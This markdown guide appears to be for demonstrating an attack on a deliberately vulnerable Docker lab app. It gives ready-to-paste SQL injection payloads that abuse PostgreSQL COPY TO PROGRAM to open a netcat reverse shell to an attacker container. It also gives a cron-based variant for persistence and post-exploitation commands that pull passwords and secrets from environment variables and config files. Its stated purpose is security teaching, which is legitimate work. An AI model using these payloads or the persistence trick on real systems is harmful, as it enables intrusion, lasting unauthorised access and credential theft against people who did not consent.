# Reverse Shell Demo Guide - Using Docker Attacker Container

## Overview
This demo uses a separate Docker container as the "attacker's machine" to catch the reverse shell. This avoids firewall issues on your host machine.

## Setup

The attacker container is already configured in `docker-compose.yml` and running on the same Docker network as the database.

**Attacker Container IP:** `172.20.0.5` (or use hostname `attacker`)

## Demo Steps

### Step 1: Shell into the Attacker Container

In a **separate terminal window**, run:
```bash
docker exec -it typo-attacker /bin/sh
```

You'll get a shell prompt inside the attacker container.

### Step 2: Start Netcat Listener in Attacker Container

Inside the attacker container shell, run:
```bash
nc -l -p 4444
```

This starts a listener on port 4444 waiting for connections.

### Step 3: Execute SQL Injection RCE

In your **browser**, go to the search page: `http://localhost:5000/search`

Enter this payload in the search box:
```sql
test'; COPY (SELECT '') TO PROGRAM 'nc attacker 4444 -e /bin/sh'; SELECT * FROM payments WHERE description ILIKE '%test%
```

Or using the IP address:
```sql
test'; COPY (SELECT '') TO PROGRAM 'nc 172.20.0.5 4444 -e /bin/sh'; SELECT * FROM payments WHERE description ILIKE '%test%
```

### Step 4: Get Your Shell!

Watch your attacker container terminal - you should get a shell connection! Try commands like:
```bash
whoami          # Shows: postgres
hostname        # Shows the database container hostname
id              # Shows user info
env             # Shows environment variables (including DB passwords!)
cat /etc/passwd # Shows system users
```

## Alternative: Persistent Reverse Shell with Cron

If the connection drops immediately, use the cron-based persistent shell:

**Payload:**
```sql
test'; COPY (SELECT '* * * * * nc attacker 4444 -e /bin/sh') TO PROGRAM 'crontab -u postgres - ; pgrep crond > /dev/null || crond'; SELECT * FROM payments WHERE description ILIKE '%test%
```

This creates a cron job that connects back every minute.

## Demo Tips

1. **Two Terminal Windows**: 
   - Terminal 1: Attacker container with netcat listener
   - Terminal 2: Your host machine (for docker commands, resets, etc.)

2. **Show the Attack Flow**:
   - Start with: "Attacker sets up listener on their machine"
   - Then: "Attacker injects SQL to create reverse shell"
   - Finally: "Attacker now has shell access to the database server"

3. **Demonstrate Impact**:
   ```bash
   # In the reverse shell, show:
   env | grep -E "PASSWORD|SECRET|KEY"    # Steal credentials
   cat /etc/passwd                         # System reconnaissance
   ls -la /var/lib/postgresql/data        # Database files
   ```

4. **Clean Up Between Demos**:
   ```bash
   # On your host
   docker restart typo-db                  # Restart database
   docker exec typo-attacker pkill nc      # Kill old connections
   ```

## Troubleshooting

**If connection drops immediately:**
- The page might hang - that's normal, it means the command is running
- Try the cron-based persistent shell method above
- Check that netcat is listening: `docker exec typo-attacker netstat -ln | grep 4444`

**To check attacker IP:**
```bash
docker inspect typo-attacker | grep IPAddress
```

**To restart attacker container:**
```bash
docker restart typo-attacker
```

## Why This Works

- Both containers are on the same Docker network (`typo-network`)
- No firewall blocking between containers
- The database container can reach the attacker container directly
- Using container hostname `attacker` is more reliable than IP
- Netcat with `-e` flag executes shell on connection

## Additional Commands to Demo

Once you have the shell, demonstrate data exfiltration:

```bash
# Dump database credentials
env | grep DB_

# List database files
ls -la /var/lib/postgresql/data/

# Check what's running
ps aux

# View PostgreSQL configuration
cat /var/lib/postgresql/data/postgresql.conf | grep password
```

This demonstrates the full impact of SQL injection leading to RCE and system compromise!
